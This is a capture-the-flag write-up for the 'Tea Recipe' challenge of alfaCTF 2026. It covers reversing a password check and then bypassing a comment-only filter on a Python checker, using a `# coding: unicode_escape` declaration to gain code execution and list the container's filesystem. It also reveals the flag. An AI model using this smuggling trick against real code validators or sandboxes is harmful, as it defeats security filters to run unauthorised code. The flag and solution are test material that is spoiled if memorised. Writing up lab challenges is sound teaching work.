# Tea Recipe — alfaCTF 2026

**Category:** Reverse / Python  
**Difficulty:** Easy  
**Tags:** reverse, python, lfsr, pep263, source-encoding  
**Flag:** `alfa{M4in_fr4MES_ARE_C0mp13X_bUt_cut3}`

## Overview

We are given `tearecipe_7a49aae.py` — a Python script that decrypts one of two LFSR-encrypted messages depending on a command-line argument. One branch yields a hint pointing to a web-hosted "Mainframe" checker that accepts Python files but enforces a comment-only filter. We have to bypass that filter to gain RCE in the checker container and read the flag.

## Stage 1 — Reverse the password check

The script gates the second message behind:

```python
bytes([n + 1 for n in sys.argv[1].encode()]).upper() != b'IJSBLFHPNB'
```

Subtracting 1 from each byte of `IJSBLFHPNB` gives `HIRAKEGOMA` — Japanese for "Open Sesame".

Running `python3 tearecipe_7a49aae.py hirakegoma` decrypts `d2` and prints:

> Mainframe is a very powerful computer, but can't brew tea ;(

The hint points to the "Mainframe" web checker on the challenge page.

## Stage 2 — Bypass the comment-only checker

The checker accepts Python files but enforces that **every line starts with `#`** (comment) before executing the file. We need code that looks like comments to a line-by-line filter but runs as real Python.

The trick: **PEP 263 source encoding declaration with `unicode_escape`**.

Python reads the `# coding:` declaration from the raw source bytes, then decodes the entire file using that codec before parsing. The `unicode_escape` codec interprets the literal characters `\n` (six ASCII bytes: backslash + n) as a real newline.

Raw file (passes the filter — only 2 lines, both start with `#`):

```
# coding: unicode_escape
#\nimport os\nprint(os.popen("ls /").read())
```

After `unicode_escape` decoding, Python actually parses:

```python
# coding: unicode_escape
#
import os
print(os.popen("ls /").read())
```

## Stage 3 — Find the flag

Using `os.walk('/')` to enumerate the container filesystem, the flag lives at a known path and is printed:

```
alfa{M4in_fr4MES_ARE_C0mp13X_bUt_cut3}
```

## Flag

`alfa{M4in_fr4MES_ARE_C0mp13X_bUt_cut3}`

## Files

Solver artifacts: [`artifacts/`](artifacts/)

| File | Role |
|------|------|
| `tearecipe_7a49aae.py` | Original challenge file — LFSR-encrypted two-message decryptor (raw bytes, not UTF-8) |
| `comments_only.py` | The `# coding: unicode_escape` payload uploaded to the Mainframe checker — every line starts with `#` so it passes the filter |
| `inner_script.py` | The inner Python that the payload decodes to (walks `/`, finds the flag) |
| `build_payload.py` | Builder — turns the inner Python into the encoded comment-only payload |
